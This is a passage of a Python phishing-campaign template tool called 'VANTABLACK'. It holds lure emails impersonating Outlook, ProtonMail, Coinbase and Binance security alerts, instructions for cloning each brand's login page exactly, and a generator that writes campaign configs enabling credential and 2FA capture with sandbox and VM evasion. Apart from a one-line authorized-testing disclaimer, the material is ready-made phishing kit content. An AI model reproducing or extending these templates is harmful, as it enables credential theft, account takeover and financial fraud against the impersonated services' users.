        id=33,
        name="Outlook.com Security",
        category="email",
        description="Microsoft Outlook security notification",
        target="Outlook.com Users, Hotmail Users",
        phishlet="outlook",
        stealth_level=4,
        difficulty="intermediate",
        success_rate="Medium",
        estimated_time="15min",
        email_template="""Subject: 🔒 Microsoft: Security alert for your account

Hi {first_name},

We detected unusual activity on your Outlook account.

⚠️ New sign-in:
• Location: {location}
• Device: {device}

[Secure Your Account]

Microsoft Account Team""",
        landing_suggestions=[
            "Clone Outlook login",
            "Use Microsoft logo",
            "Include fake account details",
            "Match Microsoft styling"
        ],
        best_practices=[
            "Copy exact Outlook CSS",
            "include Microsoft services",
            "Add Microsoft footer"
        ],
        alternatives=["Gmail", "Yahoo"]
    ),
    
    CampaignTemplate(
        id=34,
        name="ProtonMail Security",
        category="email",
        description="ProtonMail account verification",
        target="Privacy-conscious Users, Security Experts",
        phishlet="protonmail",
        stealth_level=5,
        difficulty="advanced",
        success_rate="Low",
        estimated_time="25min",
        email_template="""Subject: 🔐 Proton: Security alert

Hi {first_name},

New device login detected on your Proton account.

[Verify Device]

Proton Security Team""",
        landing_suggestions=[
            "Clone ProtonMail login",
            "Use Proton logo (purple)",
            "Include fake security features",
            "Match Proton styling (#6D4AFF)"
        ],
        best_practices=[
            "Copy exact Proton CSS",
            "include Proton features",
            "Add Proton footer"
        ],
        alternatives=["Tutanota", "Gmail"]
    ),

    # ==================== CRYPTOCURRENCY ====================
    
    CampaignTemplate(
        id=35,
        name="Coinbase Account",
        category="crypto",
        description="Coinbase - verify your identity for trading",
        target="Crypto Traders, Coinbase Users",
        phishlet="coinbase",
        stealth_level=5,
        difficulty="advanced",
        success_rate="Medium",
        estimated_time="25min",
        email_template="""Subject: 🔵 Coinbase: Verify your identity

Hi {first_name},

To continue trading on Coinbase, please verify your identity.

📋 Verification Required:
• Upload ID document
• Complete biometric verification

[Verify Now]

Coinbase Support""",
        landing_suggestions=[
            "Clone Coinbase login",
            "Use Coinbase logo (#0052FF)",
            "Include fake trading interface",
            "Match Coinbase styling"
        ],
        best_practices=[
            "Copy exact Coinbase CSS",
            "include crypto prices",
            "Add Coinbase footer"
        ],
        alternatives=["Binance", "Kraken"]
    ),
    
    CampaignTemplate(
        id=36,
        name="Binance Account Security",
        category="crypto",
        description="Binance - suspicious activity alert",
        target="Crypto Traders, Binance Users",
        phishlet="binance",
        stealth_level=5,
        difficulty="advanced",
        success_rate="Medium",
        estimated_time="25min",
        email_template="""Subject: ⚠️ Binance: Security alert

Hi {first_name},

We detected suspicious activity on your Binance account.

[Secure Your Account]

Binance Security Team""",
        landing_suggestions=[
            "Clone Binance login",
            "Use Binance logo (#F0B90B)",
            "Include fake trading view",
            "Match Binance styling"
        ],
        best_practices=[
            "Copy exact Binance CSS",
            "include crypto prices",
            "Add Binance footer"
        ],
        alternatives=["Coinbase", "FTX"]
    ),
]


def list_templates():
    """Display all available campaign templates in a beautiful table."""
    # Group by category
    categories = {}
    for template in CAMPAIGN_TEMPLATES:
        if template.category not in categories:
            categories[template.category] = []
        categories[template.category].append(template)
    
    console.print(f"\n[bold cyan]🎯 VANTABLACK Campaign Templates Library[/bold cyan]\n")
    console.print(f"[dim]Total Templates: {len(CAMPAIGN_TEMPLATES)}[/dim]\n")
    
    category_names = {
        "social": "📱 Social Media",
        "work": "💼 Productivity & Work", 
        "banking": "🏦 Banking & Finance",
        "shopping": "🛒 Shopping & E-commerce",
        "streaming": "📺 Streaming & Entertainment",
        "gaming": "🎮 Gaming",
        "cloud": "☁️ Cloud Storage",
        "email": "📧 Email Services",
        "crypto": "💰 Cryptocurrency"
    }
    
    for category, templates in categories.items():
        cat_name = category_names.get(category, category)
        console.print(f"\n[bold magenta]{cat_name}[/bold magenta]")
        
        table = Table(box=box.SIMPLE, show_header=False)
        table.add_column("ID", style="cyan", width=3)
        table.add_column("Name", style="green")
        table.add_column("Stealth", style="yellow", width=8)
        table.add_column("Difficulty", style="magenta", width=12)
        table.add_column("Success", style="white", width=8)
        
        for t in templates:
            stealth = "🛡️" * t.stealth_level
            table.add_row(str(t.id), t.name[:40], stealth, t.difficulty, t.success_rate)
        
        console.print(table)


def show_template_details(template_id: int):
    """Show detailed information about a specific template."""
    template = next((t for t in CAMPAIGN_TEMPLATES if t.id == template_id), None)
    
    if not template:
        console.print(f"[red]Template #{template_id} not found[/red]")
        return
    
    console.print()
    
    # Header panel
    panel_content = f"""
[bold cyan]{template.name}[/bold cyan]

[yellow]📋 Description:[/yellow] {template.description}

[yellow]🎯 Target Audience:[/yellow] {template.target}
[yellow]📂 Category:[/yellow] {template.category}
[yellow]🪝 Phishlet:[/yellow] {template.phishlet}
[yellow]🛡️ Stealth Level:[/yellow] {template.stealth_level}/5
[yellow]📊 Difficulty:[/yellow] {template.difficulty}
[yellow]📈 Success Rate:[/yellow] {template.success_rate}
[yellow]⏱️ Setup Time:[/yellow] {template.estimated_time}
    """
    
    console.print(Panel.fit(panel_content, title="Template Details", border_style="cyan", box=box.ROUNDED))
    
    # Email template
    console.print("\n[bold magenta]📧 Email Template:[/bold magenta]")
    console.print(Panel.fit(template.email_template, border_style="green", box=box.SIMPLE))
    
    # Landing page suggestions
    console.print("\n[bold magenta]💡 Landing Page Suggestions:[/bold magenta]")
    for i, suggestion in enumerate(template.landing_suggestions, 1):
        console.print(f"  {i}. {suggestion}")
    
    # Best practices
    console.print("\n[bold magenta]✨ Best Practices:[/bold magenta]")
    for i, practice in enumerate(template.best_practices, 1):
        console.print(f"  {i}. {practice}")
    
    # Alternatives
    if template.alternatives:
        console.print("\n[bold magenta]🔄 Alternative Templates:[/bold magenta]")
        for alt in template.alternatives:
            console.print(f"  • {alt}")


def search_templates(search_term: str):
    """Search templates by keyword."""
    search_term = search_term.lower()
    results = []
    
    for template in CAMPAIGN_TEMPLATES:
        if (search_term in template.name.lower() or 
            search_term in template.description.lower() or
            search_term in template.target.lower() or
            search_term in template.category.lower()):
            results.append(template)
    
    if not results:
        console.print(f"[yellow]No templates found matching '{search_term}'[/yellow]")
        return
    
    console.print(f"\n[bold cyan]Search Results for '{search_term}'[/bold cyan]")
    console.print(f"[dim]Found {len(results)} template(s)[/dim]\n")
    
    table = Table(box=box.SIMPLE)
    table.add_column("ID", style="cyan", width=3)
    table.add_column("Name", style="green")
    table.add_column("Category", style="magenta")
    table.add_column("Success", style="white", width=8)
    
    for t in results:
        table.add_row(str(t.id), t.name[:40], t.category, t.success_rate)
    
    console.print(table)


def generate_campaign_files(template_id: int):
    """Generate complete campaign files from a template."""
    import os
    from datetime import datetime
    
    template = next((t for t in CAMPAIGN_TEMPLATES if t.id == template_id), None)
    if not template:
        console.print(f"[red]Template #{template_id} not found[/red]")
        return
    
    # Create campaign directory
    safe_name = "".join(c for c in template.name if c.isalnum() or c in " -").strip().replace(" ", "_").lower()
    campaign_dir = f"campaigns/{safe_name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
    os.makedirs(campaign_dir, exist_ok=True)
    
    # 1. Email template
    email_file = f"{campaign_dir}/email_template.txt"
    with open(email_file, 'w') as f:
        f.write(f"""Subject: {template.name}

{template.email_template}

---
Campaign ID: {template.id}
Category: {template.category}
Stealth Level: {template.stealth_level}/5
Generated by VANTABLACK Campaign Templates
""")
    console.print(f"  ✓ [green]email_template.txt[/green]")
    
    # 2. Configuration file
    config_file = f"{campaign_dir}/campaign_config.yaml"
    with open(config_file, 'w') as f:
        f.write(f"""# ============================================================
# VANTABLACK Campaign Configuration
# ============================================================
# Template: {template.name}
# Category: {template.category}
# Generated: {datetime.now().isoformat()}

campaign:
  name: "{template.name}"
  description: "{template.description}"
  target: "{template.target}"
  category: "{template.category}"
  phishlet: "{template.phishlet}"
  stealth_level: {template.stealth_level}
  difficulty: "{template.difficulty}"
  success_rate: "{template.success_rate}"
  estimated_time: "{template.estimated_time}"

# Email Configuration
email:
  subject: "{template.name}"
  from: "Support <support@yourdomain.com>"
  reply_to: ""

# Landing Page Configuration
landing:
  redirect_url: "https://target-website.com"
  capture_credentials: true
  capture_2fa: true
  stealth_mode: {template.stealth_level >= 4}

# Best Practices for This Campaign
best_practices:
""")
        for practice in template.best_practices:
            f.write(f'  - "{practice}"\n')
        
        f.write("""
# Evasion Settings
evasion:
  sandbox_detect: true
  vm_detect: true
  automation_check: true
  
# Notifications
notify:
  telegram:
    enabled: false
  discord:
    enabled: false
""")
    console.print(f"  ✓ [green]campaign_config.yaml[/green]")
    
    # 3. Planning notes
    notes_file = f"{campaign_dir}/PLANNING_NOTES.md"
    with open(notes_file, 'w') as f:
        f.write(f"""# 📋 Campaign Planning Notes: {template.name}

## Overview
- **Template ID**: {template.id}
- **Category**: {template.category}
- **Target Audience**: {template.target}
- **Success Rate**: {template.success_rate}
- **Difficulty**: {template.difficulty}
- **Estimated Setup Time**: {template.estimated_time}

## Description
{template.description}

## Technical Details
- **Phishlet**: {template.phishlet}
- **Stealth Level**: {template.stealth_level}/5

## 🛡️ Landing Page Requirements
""")
        for i, suggestion in enumerate(template.landing_suggestions, 1):
            f.write(f"{i}. {suggestion}\n")
        
        f.write("\n## ✨ Best Practices\n")
        for i, practice in enumerate(template.best_practices, 1):
            f.write(f"{i}. {practice}\n")
        
        f.write(f"""
## 📧 Email Variables
Replace these in your email template:
- `{{first_name}}` - Recipient's first name
- `{{email}}` - Recipient's email address
- `{{timestamp}}` - Current timestamp
- `{{location}}` - Target location (optional)

## ✅ Pre-Launch Checklist
- [ ] Test landing page thoroughly
- [ ] Verify SSL certificate
- [ ] Test email deliverability
- [ ] Configure notifications
- [ ] Set up redirect URLs
- [ ] Test with sandbox detection disabled first
- [ ] Enable stealth mode for production

## ⚠️ Legal Disclaimer
This campaign template is provided for authorized security testing only.
Ensure you have proper authorization before deploying any phishing simulation.
""")
    console.print(f"  ✓ [green]PLANNING_NOTES.md[/green]")
    
    # 4. Quick start guide
    quickstart_file = f"{campaign_dir}/QUICKSTART.sh"
    with open(quickstart_file, 'w') as f:
        f.write(f"""#!/bin/bash
# Quick Start Script - {template.name}
# Generated by VANTABLACK Campaign Templates

echo "🎯 Starting {template.name}"
echo "Category: {template.category}"
echo "Stealth Level: {template.stealth_level}/5"
echo ""

# Check dependencies
echo "Checking dependencies..."
python3 --version || {{ echo "Python required"; exit 1; }}

# Generate email (replace variables)
echo "Generating email with variables..."
cat email_template.txt | sed 's/{{first_name}}/TARGET_NAME/g' > email_ready.txt

echo ""
echo "✅ Campaign files prepared in: {campaign_dir}"
echo ""
echo "Next steps:"
echo "1. Customize email_template.txt with your targets"
echo "2. Edit campaign_config.yaml"
echo "3. Review PLANNING_NOTES.md"
echo "4. Run: cd campaigns/{safe_name}_* && vanta.py --start"
""")
    os.chmod(quickstart_file, 0o755)
    console.print(f"  ✓ [green]QUICKSTART.sh[/green]")
    
    console.print(f"\n[bold green]✓ Campaign '{template.name}' generated successfully![/bold green]")
    console.print(f"[cyan]📁 Files saved to: {campaign_dir}/[/cyan]")


def main():
    """Main entry point."""
    if len(sys.argv) == 1:
        list_templates()
        return
    
    command = sys.argv[1]
    
    if command in ["--list", "-l"]:
        list_templates()
    
    elif command in ["--show", "-s"]:
        if len(sys.argv) > 2:
            try:
                template_id = int(sys.argv[2])
                show_template_details(template_id)
            except ValueError:
                console.print("[red]Invalid template ID[/red]")
        else:
            console.print("[yellow]Usage: campaign_templates.py --show <id>[/yellow]")
            console.print("\n[cyan]Showing all templates:[/cyan]")
            list_templates()
    
    elif command in ["--generate", "-g"]:
        if len(sys.argv) > 2:
            try:
                template_id = int(sys.argv[2])
                generate_campaign_files(template_id)
            except ValueError:
                console.print("[red]Invalid template ID[/red]")
        else:
            console.print("[yellow]Usage: campaign_templates.py --generate <id>[/yellow]")
    
    elif command in ["--search", "-s"] and len(sys.argv) > 2:
        search_templates(sys.argv[2])
    
    elif command in ["--help", "-h"]:
        console.print("""
[bold cyan]VANTABLACK Campaign Templates[/bold cyan]

[green]Usage:[/green]
  python3 campaign_templates.py                 # List all templates
  python3 campaign_templates.py --list         # List all templates
  python3 campaign_templates.py --show <id>     # Show template details
  python3 campaign_templates.py --generate <id> # Generate campaign files
  python3 campaign_templates.py --search <term> # Search templates
  python3 campaign_templates.py --help         # Show this help

[yellow]Examples:[/yellow]
  python3 campaign_templates.py --list
  python3 campaign_templates.py --show 6
  python3 campaign_templates.py --generate 1
  python3 campaign_templates.py --search facebook
        """)
    
    else:
        list_templates()


if __name__ == "__main__":
    main()
